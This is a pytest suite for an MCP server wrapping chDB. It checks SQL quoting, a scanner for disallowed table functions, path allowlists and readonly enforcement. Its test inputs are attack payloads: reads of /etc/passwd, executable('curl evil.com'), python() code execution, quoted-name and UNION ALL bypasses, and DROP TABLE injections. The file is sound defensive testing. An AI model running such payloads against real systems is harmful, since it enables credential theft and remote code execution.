"""Smoke tests for the tools and hardening fixes.

These import the tool functions directly (FastMCP keeps the decorated function
callable as a plain Python function), so we exercise the same code path the
MCP dispatcher hits.
"""

from __future__ import annotations

import os
import tempfile
from pathlib import Path

import pytest

from chdb_mcp.server import (
    describe_table,
    get_sample_data,
    list_databases,
    list_functions,
    list_tables,
    query,
    query_file,
)
from chdb_mcp.utils import (
    SAFE_TABLE_FUNCTIONS,
    find_disallowed_table_function_calls,
    quote_ident,
    quote_string,
    truncate,
)

# A representative "known" set for the unit tests: every external-reach
# table function we want to catch, plus a couple of safe ones to confirm
# the safe-set still passes through. Real callers pass the dynamic snapshot
# from system.table_functions; this fixture keeps the unit tests deterministic.
_TEST_KNOWN = frozenset(
    {
        "file",
        "filecluster",
        "url",
        "s3",
        "remote",
        "executable",
        "python",
        "cosn",
        "oss",
        "iceberg",
        "icebergs3",
        "paimon",
        "ytsaurus",
        # Safe ones, included so scanner can confirm it skips them.
        "numbers",
        "values",
        "view",
        "merge",
    }
)


# --------------------------------------------------------------------------- #
# Pure utilities (no chDB needed)
# --------------------------------------------------------------------------- #


def test_truncate_under_limit_is_passthrough() -> None:
    assert truncate("hello", 1024) == "hello"


def test_truncate_over_limit_appends_notice() -> None:
    out = truncate("x" * 2048, 100)
    assert out.startswith("x" * 100)
    assert "truncated at 100 bytes" in out


def test_quote_ident_rejects_dangerous_input() -> None:
    with pytest.raises(ValueError):
        quote_ident("foo; DROP TABLE users")


def test_quote_ident_accepts_plain_names() -> None:
    assert quote_ident("my_table") == "`my_table`"


def test_quote_string_escapes_single_quotes() -> None:
    assert quote_string("o'brien") == "'o''brien'"


def test_quote_string_escapes_backslash_before_quote() -> None:
    """ClickHouse honours `\\'` as a quote escape; the wrapper must escape
    backslashes too or a payload `x\\'` could close the literal."""
    assert quote_string("x\\'") == "'x\\\\'''"
    assert quote_string("a\\b") == "'a\\\\b'"
    assert quote_string("o'brien") == "'o''brien'"


def test_safe_table_functions_includes_common_safe_ones() -> None:
    """Tripwire: if someone drops one of these from the safe set, every
    `SELECT * FROM numbers(10)` style call under an allowlist breaks."""
    for name in ("numbers", "values", "view", "merge", "dictionary", "generaterandom"):
        assert name in SAFE_TABLE_FUNCTIONS


def test_scanner_flags_external_sources() -> None:
    sql = (
        "SELECT * FROM file('/etc/passwd', 'LineAsString') "
        "JOIN s3('s3://b/x.parquet') USING (k) "
        "WHERE k IN (SELECT id FROM remote('host', 'db.t'))"
    )
    assert find_disallowed_table_function_calls(sql, _TEST_KNOWN) == ["file", "remote", "s3"]


def test_scanner_is_case_insensitive() -> None:
    assert find_disallowed_table_function_calls("SELECT FILE('x','CSV')", _TEST_KNOWN) == ["file"]
    assert find_disallowed_table_function_calls("SELECT URL('h')", _TEST_KNOWN) == ["url"]


def test_scanner_ignores_strings_and_comments() -> None:
    assert find_disallowed_table_function_calls("SELECT 's3(\\'x\\')' AS s", _TEST_KNOWN) == []
    assert find_disallowed_table_function_calls("SELECT 1 -- file('/x')\nFROM t", _TEST_KNOWN) == []
    assert find_disallowed_table_function_calls("SELECT /* url('x') */ 1", _TEST_KNOWN) == []


def test_scanner_does_not_match_substring() -> None:
    # `filename` and `s3hash` aren't in the known set, so they're ignored
    # regardless of word-boundary behavior.
    assert (
        find_disallowed_table_function_calls("SELECT filename(x), s3hash(y) FROM t", _TEST_KNOWN)
        == []
    )


def test_scanner_resists_comment_smuggling() -> None:
    """A pair of strings containing `/*` and `*/` around a real call could,
    under naive comment-then-string masking, erase the call. The single-pass
    mask must consume each construct atomically."""
    sql = "SELECT '/*' AS a, file('/etc/passwd', 'LineAsString'), '*/' AS b"
    assert find_disallowed_table_function_calls(sql, _TEST_KNOWN) == ["file"]


def test_scanner_handles_quote_inside_comment() -> None:
    """A `'` inside a comment must not mis-pair with later quotes and swallow
    the real file() call."""
    sql = "SELECT 1 -- it's a test\nFROM file('/data/x.parquet', 'Parquet')"
    assert find_disallowed_table_function_calls(sql, _TEST_KNOWN) == ["file"]


def test_scanner_handles_backslash_quote_in_string() -> None:
    """ClickHouse's `\\'` escape: the s3( is inside a string literal, so the
    function-call regex must NOT match it."""
    assert find_disallowed_table_function_calls("SELECT '\\'s3(' AS s", _TEST_KNOWN) == []


def test_scanner_normalizes_backtick_quoted_function_name() -> None:
    """P0-2 attack vector: chDB accepts `file`(...) as a call. The scanner
    strips matched backtick pairs around \\w+ before matching."""
    assert find_disallowed_table_function_calls(
        "SELECT * FROM `file`('/etc/passwd', 'LineAsString')", _TEST_KNOWN
    ) == ["file"]
    assert find_disallowed_table_function_calls("SELECT * FROM `s3`('s3://b/x')", _TEST_KNOWN) == [
        "s3"
    ]


def test_scanner_normalizes_double_quoted_function_name() -> None:
    """P0-2 attack vector: chDB also accepts \"file\"(...). Same treatment as
    backticks."""
    assert find_disallowed_table_function_calls(
        "SELECT * FROM \"file\"('/etc/passwd', 'LineAsString')", _TEST_KNOWN
    ) == ["file"]


def test_scanner_flags_rce_class_table_functions() -> None:
    """`executable` and `python` are RCE primitives in chDB — running a shell
    command / arbitrary Python in-process. They must be detected as not-safe
    just like file()/url()."""
    assert find_disallowed_table_function_calls(
        "SELECT * FROM executable('curl evil.com', 'CSV')", _TEST_KNOWN
    ) == ["executable"]
    assert find_disallowed_table_function_calls(
        "SELECT * FROM python('print(open(\"/etc/passwd\").read())')", _TEST_KNOWN
    ) == ["python"]


def test_scanner_flags_cluster_variants() -> None:
    """fileCluster / urlCluster etc. are full table functions in chDB 26.3 —
    they reach outside just like their non-cluster siblings."""
    assert find_disallowed_table_function_calls(
        "SELECT * FROM fileCluster('cluster', '/etc/passwd', 'LineAsString')", _TEST_KNOWN
    ) == ["filecluster"]


def test_scanner_lets_safe_table_functions_through() -> None:
    """Scalar / generator / in-engine table functions must pass even when
    the allowlist is configured."""
    assert (
        find_disallowed_table_function_calls(
            "SELECT * FROM numbers(10) UNION ALL SELECT * FROM values('x UInt8', 1)",
            _TEST_KNOWN,
        )
        == []
    )
    # view() can wrap arbitrary SQL but the text-level scanner sees inside.
    assert find_disallowed_table_function_calls("SELECT * FROM view(SELECT 1)", _TEST_KNOWN) == []
    # view() containing a non-safe call is still flagged via the inner token.
    assert find_disallowed_table_function_calls(
        "SELECT * FROM view(SELECT * FROM file('/etc/passwd', 'CSV'))", _TEST_KNOWN
    ) == ["file"]


def test_scanner_ignores_unknown_table_functions() -> None:
    """If chDB removes/renames a function so it's no longer in the known set,
    the scanner stops flagging it. This is the "stay in sync with engine"
    property — the alternative (hand-maintained denylist) silently goes
    stale."""
    # `madeupfn` is not in _TEST_KNOWN.
    assert (
        find_disallowed_table_function_calls("SELECT * FROM madeupfn('whatever')", _TEST_KNOWN)
        == []
    )


# --------------------------------------------------------------------------- #
# Tool integration tests (require chdb)
# --------------------------------------------------------------------------- #


def test_query_returns_value() -> None:
    out = query("SELECT 1 AS x, 'hi' AS y")
    assert "1" in out
    assert "hi" in out


def test_writes_are_blocked_by_default() -> None:
    """README's main safety claim: `SET readonly=2` is applied at session start."""
    with pytest.raises(RuntimeError, match=r"readonly"):
        query("CREATE TABLE default.should_not_exist (a Int32) ENGINE=Memory")


def test_run_truncates_output_at_max_result_bytes(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Confirm `_run()` actually applies `truncate(_, _CONFIG.max_result_bytes)`."""
    from chdb_mcp import server
    from chdb_mcp.config import Config

    tiny = Config(
        readonly=True,
        max_result_bytes=200,
        query_timeout_sec=30,
        file_allowlist=(),
        session_path=None,
    )
    monkeypatch.setattr(server, "_CONFIG", tiny)

    out = query("SELECT number FROM system.numbers LIMIT 100", "JSONCompact")
    assert "truncated at 200 bytes" in out
    assert len(out.encode("utf-8")) < 400


def test_list_databases_includes_system() -> None:
    out = list_databases()
    assert "system" in out


def test_list_tables_system_nonempty() -> None:
    out = list_tables("system")
    assert "tables" in out or "numbers" in out


def test_list_tables_rejects_identifier_injection() -> None:
    with pytest.raises(ValueError, match=r"invalid SQL identifier"):
        list_tables("foo; DROP TABLE bar")


def test_describe_table_returns_columns() -> None:
    out = describe_table("system", "one")
    assert "dummy" in out


def test_get_sample_data_respects_limit() -> None:
    out = get_sample_data("system", "numbers", limit=3)
    assert out.count("\n") >= 1


def test_get_sample_data_clamps_huge_limit() -> None:
    out = get_sample_data("system", "numbers", limit=999_999)
    assert isinstance(out, str)


def test_query_file_requires_placeholder() -> None:
    with pytest.raises(ValueError, match=r"placeholder"):
        query_file(path="/tmp/x.csv", sql="SELECT 1", format="CSV")


def test_check_path_resolves_allowlist_symlinks(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    from chdb_mcp import server

    resolved_tmp = str(Path("/tmp").resolve())
    monkeypatch.setattr(server, "_RESOLVED_ALLOWLIST", (resolved_tmp,))
    server._check_path("/tmp/some_file.parquet")


def test_check_path_rejects_sibling_prefix_attack(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    from chdb_mcp import server

    resolved_tmp = str(Path("/tmp").resolve())
    monkeypatch.setattr(server, "_RESOLVED_ALLOWLIST", (resolved_tmp,))
    with pytest.raises(ValueError, match=r"not under any prefix"):
        server._check_path("/tmp_evil/x.parquet")


def test_check_path_passthrough_when_allowlist_empty(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    from chdb_mcp import server

    monkeypatch.setattr(server, "_RESOLVED_ALLOWLIST", ())
    server._check_path("/anywhere/at/all.parquet")  # must not raise


def test_query_file_counts_rows_from_csv() -> None:
    with tempfile.NamedTemporaryFile("w", suffix=".csv", delete=False) as fh:
        fh.write("a,b\n1,one\n2,two\n3,three\n")
        path = fh.name
    try:
        out = query_file(
            path=path,
            sql="SELECT count() FROM {file}",
            format="CSVWithNames",
        )
        assert "3" in out
    finally:
        os.unlink(path)


# --------------------------------------------------------------------------- #
# Allowlist gating (post-review hardening)
# --------------------------------------------------------------------------- #


def test_query_rejects_external_sources_when_allowlist_set(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Raw query() with file()/s3()/remote() must be rejected when the
    allowlist is configured."""
    from chdb_mcp import server

    monkeypatch.setattr(server, "_RESOLVED_ALLOWLIST", ("/tmp",))
    with pytest.raises(ValueError, match=r"non-safe table functions"):
        query("SELECT count() FROM file('/etc/passwd', 'LineAsString')")
    with pytest.raises(ValueError, match=r"non-safe table functions"):
        query("SELECT * FROM s3('s3://bucket/x.parquet')")
    with pytest.raises(ValueError, match=r"non-safe table functions"):
        query("SELECT 1 FROM remote('host', 'db.t')")


def test_query_rejects_quoted_function_name_bypass(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """P0-2: backtick- and double-quoted function names previously bypassed
    the scanner because the regex only matched bare identifiers."""
    from chdb_mcp import server

    monkeypatch.setattr(server, "_RESOLVED_ALLOWLIST", ("/tmp",))
    with pytest.raises(ValueError, match=r"non-safe table functions"):
        query("SELECT count() FROM `file`('/etc/passwd', 'LineAsString')")
    with pytest.raises(ValueError, match=r"non-safe table functions"):
        query("SELECT count() FROM \"file\"('/etc/passwd', 'LineAsString')")


def test_query_rejects_rce_class_table_functions(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """`executable` and `python` were missing from the v0.1.1 denylist entirely;
    confirm the dynamic allowlist catches them."""
    from chdb_mcp import server

    monkeypatch.setattr(server, "_RESOLVED_ALLOWLIST", ("/tmp",))
    with pytest.raises(ValueError, match=r"non-safe table functions"):
        query("SELECT * FROM executable('id', 'CSV')")


def test_query_file_rejects_extra_external_calls_in_user_sql(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """P0-1: the UNION ALL bypass. query_file's path check gates the
    placeholder, but the user's surrounding SQL could attach a second
    file()/url()/etc. call. Scanner now runs on the user SQL before
    substitution."""
    from chdb_mcp import server

    # _RESOLVED_ALLOWLIST must hold paths in their symlink-resolved form, the
    # same form _check_path() compares against. On macOS /tmp resolves to
    # /private/tmp, so writing a literal "/tmp" here would make the path
    # check fail first and the assertion below would catch the wrong error.
    resolved_tmp = str(Path("/tmp").resolve())
    monkeypatch.setattr(server, "_RESOLVED_ALLOWLIST", (resolved_tmp,))
    with tempfile.NamedTemporaryFile("w", suffix=".csv", dir=resolved_tmp, delete=False) as fh:
        fh.write("a\n1\n2\n")
        benign = fh.name
    try:
        with pytest.raises(ValueError, match=r"non-safe table functions"):
            query_file(
                path=benign,
                sql=(
                    "SELECT count() FROM {file} UNION ALL "
                    "SELECT count() FROM file('/etc/passwd', 'LineAsString')"
                ),
                format="CSV",
            )
    finally:
        os.unlink(benign)


def test_query_file_normal_use_still_works_with_allowlist(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A plain query_file with just `{file}` must still succeed under allowlist —
    no false positives on the placeholder."""
    from chdb_mcp import server

    resolved_tmp = str(Path("/tmp").resolve())
    monkeypatch.setattr(server, "_RESOLVED_ALLOWLIST", (resolved_tmp,))
    with tempfile.NamedTemporaryFile("w", suffix=".csv", dir=resolved_tmp, delete=False) as fh:
        fh.write("a\n1\n2\n3\n")
        path = fh.name
    try:
        out = query_file(
            path=path,
            sql="SELECT count() FROM {file}",
            format="CSVWithNames",
        )
        assert "3" in out
    finally:
        os.unlink(path)


def test_query_allows_safe_table_functions_when_allowlist_set(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """numbers(), values(), view() etc. are safe-by-construction and must
    pass even with the allowlist on."""
    from chdb_mcp import server

    monkeypatch.setattr(server, "_RESOLVED_ALLOWLIST", ("/tmp",))
    out = query("SELECT count() FROM numbers(10)")
    assert "10" in out


def test_query_allows_external_sources_when_allowlist_empty(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """When the allowlist is unset, query() accepts any SQL (the README's
    documented default — host process owns the boundary)."""
    from chdb_mcp import server

    monkeypatch.setattr(server, "_RESOLVED_ALLOWLIST", ())
    with tempfile.NamedTemporaryFile("w", suffix=".csv", delete=False) as fh:
        fh.write("a\n1\n2\n")
        p = fh.name
    try:
        out = query(f"SELECT count() FROM file('{p}', 'CSV')")
        assert "2" in out
    finally:
        os.unlink(p)


def test_max_result_bytes_actually_caps_engine_output() -> None:
    from chdb_mcp import server

    out = query(
        "SELECT randomPrintableASCII(100) FROM numbers(50000)",
        format="CSV",
    )
    cap = server._CONFIG.max_result_bytes
    assert len(out.encode("utf-8")) <= cap + 64 * 1024


def test_list_functions_includes_well_known_names() -> None:
    out = list_functions()
    assert "name\tis_aggregate" in out
    assert "\nsum\t" in out or "\nsum\n" in out
    assert "\ncount\t" in out or "\ncount\n" in out


def test_list_functions_substring_filter_narrows_results() -> None:
    all_fns = list_functions()
    quantile_only = list_functions(pattern="quantile")
    assert len(quantile_only) < len(all_fns)
    assert "quantile" in quantile_only.lower()
    assert quantile_only.count("\n") >= 2


def test_list_functions_pattern_escapes_quotes() -> None:
    out = list_functions(pattern="x'; DROP TABLE y; --")
    assert "name\tis_aggregate" in out


def test_server_module_advertises_version_and_name() -> None:
    from chdb_mcp import __version__, server

    assert server.mcp._mcp_server.name == "chdb-mcp"
    assert server.mcp._mcp_server.version == __version__


def test_empty_resources_and_prompts_capabilities_are_not_advertised() -> None:
    from mcp.server.lowlevel.server import NotificationOptions

    from chdb_mcp import server

    caps = server.mcp._mcp_server.get_capabilities(NotificationOptions(), {})
    assert caps.prompts is None
    assert caps.resources is None
    assert caps.tools is not None


def test_known_table_functions_populated_from_system_catalog() -> None:
    """Session init queries system.table_functions and caches the lowercase
    name set so the scanner stays in sync with the running engine."""
    from chdb_mcp import server

    # Force session init.
    server._get_session()
    # chDB 26.x has many — exact count drifts; sanity-check ≥ 30 and that
    # known-dangerous names are in there.
    assert len(server._KNOWN_TABLE_FUNCTIONS) >= 30
    for name in ("file", "url", "s3", "remote", "executable", "python"):
        assert name in server._KNOWN_TABLE_FUNCTIONS, name
    for name in ("numbers", "values", "view", "merge"):
        assert name in server._KNOWN_TABLE_FUNCTIONS, name
